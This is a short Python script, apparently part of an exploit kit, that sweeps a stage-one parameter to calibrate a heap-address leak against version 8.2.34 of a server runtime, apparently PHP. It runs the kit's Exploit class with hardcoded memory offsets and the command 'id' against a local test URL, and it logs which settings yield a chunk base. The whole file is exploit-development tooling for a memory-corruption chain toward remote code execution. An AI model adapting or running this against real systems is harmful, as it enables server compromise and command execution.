"""Sweep stage1_n for 8.2.34 to find the working heap-leak calibration."""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E

URL = "http://127.0.0.1:18111/"
ZIF = 0x39b8a0
DTOR = 0x487650
HTDATA = 0x690d8

def try_stage1(n, t, ex_base):
    """Run stage1 with a given stage1_n, return (chunk_base or 0)."""
    ex = E.Exploit(t, "id", zif_offset=ZIF, dtor_offset=DTOR,
                   htdata_offset=HTDATA, huge_mb=12, verbose=False,
                   profile="bookworm")
    ex.stage1_n = n
    ex.rotate()
    chunk = ex.stage1()
    return chunk

t = E.Target(URL, timeout=60.0, verbose=False)

results = []
for n in range(800, 960, 4):
    try:
        chunk = try_stage1(n, t, None)
    except Exception as e:
        chunk = 0
        print(f"  n={n}: ERROR {e}", flush=True)
    if chunk:
        print(f"[+] n={n}: CHUNK BASE = 0x{chunk:x}", flush=True)
        results.append((n, chunk))
    else:
        print(f"  n={n}: miss", flush=True)

print(f"\n=== {len(results)} hits out of {(960-800)//4} ===", flush=True)
for n, c in results:
    print(f"  n={n}: 0x{c:x}", flush=True)
